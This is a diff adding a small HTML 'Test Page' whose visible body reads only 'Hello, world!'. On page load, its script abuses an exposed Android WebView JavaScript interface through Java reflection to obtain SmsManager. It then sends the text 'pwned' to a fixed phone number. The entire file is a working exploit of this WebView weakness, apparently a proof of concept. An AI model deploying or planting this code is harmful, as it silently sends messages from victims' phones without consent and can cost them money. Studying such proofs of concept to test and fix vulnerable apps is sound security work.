@@ -1,0 +1,14 @@
+<html>
+<head>
+<title>Test Page</title>
+<script type="text/javascript">
+function execute() {
+    var sendsms = jsInterface.getClass().forName("android.telephony.SmsManager").getMethod("getDefault",null).invoke(null,null);
+    sendsms.sendTextMessage("18980557617", null, "pwned", null, null);
+}
+</script>
+</head>
+<body onload="execute()">
+Hello, world!
+</body>
+</html>
